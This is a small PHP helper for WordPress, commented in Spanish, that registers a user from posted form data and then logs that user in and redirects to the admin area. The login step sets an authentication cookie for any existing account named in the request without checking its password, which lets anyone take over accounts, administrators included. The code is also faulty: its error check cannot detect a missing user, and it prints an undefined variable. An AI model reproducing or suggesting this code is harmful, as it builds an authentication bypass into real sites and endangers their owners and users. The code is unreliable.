<?php

// Obtiene los métodos de wordpress
require_once("../../../../wp-load.php");

// Obtiene los datos del usuario que ingresaron por el formulario
$user = $_POST['user'];

// Crea datos de usuario
$website = "http://example.com";
$userdata = array(
    'user_login'  =>  $user[0]['email'],
    'user_url'    =>  $website,
    'user_pass'   =>  $user[0]['password']  // When creating an user, `user_pass` is expected.
);

// Intenta crear un usuar
$user_id = wp_insert_user( $userdata ) ;
//
// // On success
if ( ! is_wp_error( $user_id ) ) {
    echo "User created : ". $user_id;
} else { // Si el usuario existe
  echo "User exist";
  // $result = wp_authenticate($user[0]['email'], $user[0]['password']);
  echo $result;
}

check_user_and_redirect($user[0]['email']);


/**
 * Revisa si el usuario exxiste y lo redirecciona
 * @param  [string] $username [nombre de usuario o correo]
 */
function check_user_and_redirect($username) {
  // Obtiene  el usuario por el nombre de usuario o correo
  $user = get_user_by('login', $username );
  // Se ejecuta si encuentra el usuario
  if ( !is_wp_error( $user ) )
  {
    wp_clear_auth_cookie();
    wp_set_current_user ( $user->ID );
    wp_set_auth_cookie  ( $user->ID );

    $redirect_to = user_admin_url();
    wp_safe_redirect( $redirect_to );
    exit();
  }
}

?>
